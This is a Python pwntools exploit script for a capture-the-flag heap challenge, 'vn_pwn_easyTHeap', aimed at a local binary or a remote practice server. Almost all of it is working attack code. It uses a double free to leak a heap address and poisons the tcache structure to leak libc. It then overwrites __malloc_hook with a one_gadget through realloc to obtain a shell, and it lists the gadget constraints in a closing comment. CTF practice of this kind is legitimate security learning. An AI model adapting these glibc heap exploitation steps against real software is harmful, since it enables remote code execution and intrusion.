#! /usr/bin/python

import sys
from pwn import *
from LibcSearcher import *

sl = lambda a:p.sendline(a)
sd = lambda a:p.send(a)
sda = lambda x,y:p.sendafter(x,y)
sla = lambda a,b:p.sendlineafter(a,b)
rv = lambda a:p.recv(a)
ru = lambda a:p.recvuntil(a)
ia = lambda :p.interactive()
context.log_level = 'debug'

if(sys.argv[1] == 'l'):
	p = process('./vn_pwn_easyTHeap')
	elf = ELF('./vn_pwn_easyTHeap',checksec=False)
	libc = ELF('/lib/x86_64-linux-gnu/libc-2.27.so',checksec=False)

else:
	p = remote('node3.buuoj.cn',25197)
	elf = ELF('./vn_pwn_easyTHeap',checksec=False)
	libc = ELF('/lib/x86_64-linux-gnu/libc-2.27.so',checksec=False)

def menu(cmd):
	sla("choice: ",str(cmd))

def add(size):
	menu(1)
	sla("size?",str(size))

def edit(idx,content):
	menu(2)
	sla("idx?",str(idx))
	sla("content:",content)

def show(idx):
	menu(3)
	sla("idx?",str(idx))

def delete(idx):
	menu(4)
	sla("idx?",str(idx))

###leak heap###
add(0x80)#0
add(0x20)#1


delete(0)
delete(0)


show(0)
heap = u64(ru('\x55')[-6:].ljust(8,'\x00')) - 0x260
success(hex(heap))

###leak libc###
struct = heap + 0x10
add(0x80)#2
edit(2,p64(struct))
add(0x80)#3

payload = p64(0x700000000000000)
add(0x80)#4 tcache structure
edit(4,payload)

delete(2)
show(2)

main_arena = u64(ru('\x7f')[-6:].ljust(8,'\x00')) - 96
libc_base = main_arena - 0x3ebc40

###modify tcache->entries###
realloc = libc_base + libc.symbols['__libc_realloc']
malloc_hook = libc_base + libc.symbols['__malloc_hook']
system = libc_base + libc.symbols['system']
libc_one_gadget = [0x4f2c5,0x4f322,0x10a38c]
one_gadget = libc_base + libc_one_gadget[2]

payload = '\x00' * 0x78 + p64(malloc_hook-0x8)
edit(4,payload)#modify tcache structure->entries

#gdb.attach(p)

payload = p64(one_gadget) + p64(realloc+0x8)
add(0x80)#5
edit(5,payload)

success(hex(one_gadget))
#gdb.attach(p)

###get shell###
ia()

'''
0x4f2c5 execve("/bin/sh", rsp+0x40, environ)
constraints:
  rsp & 0xf == 0
  rcx == NULL

0x4f322 execve("/bin/sh", rsp+0x40, environ)
constraints:
  [rsp+0x40] == NULL

0x10a38c execve("/bin/sh", rsp+0x70, environ)
constraints:
  [rsp+0x70] == NULL

'''
